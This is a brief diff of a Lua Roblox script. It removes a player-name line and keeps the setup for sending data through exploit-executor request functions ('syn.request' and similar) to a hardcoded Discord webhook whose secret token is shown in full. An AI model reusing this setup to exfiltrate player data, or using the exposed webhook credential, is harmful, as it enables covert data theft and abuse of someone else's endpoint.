@@ -1,4 +1,3 @@
-game.Players.LocalPlayer.Name = "AfxcaxiRoblox"
 local a = "https://discord.com/api/webhooks/1253292871742656622/3K5JXML8DOgGvNFE57Dx0soNpfx1FNSESoHBAqtxNT2Xb8DjO3e_Q_tnyH-oEvkDms4O"
 local b = game:GetService("HttpService")
 local c = http_request or request or syn.request
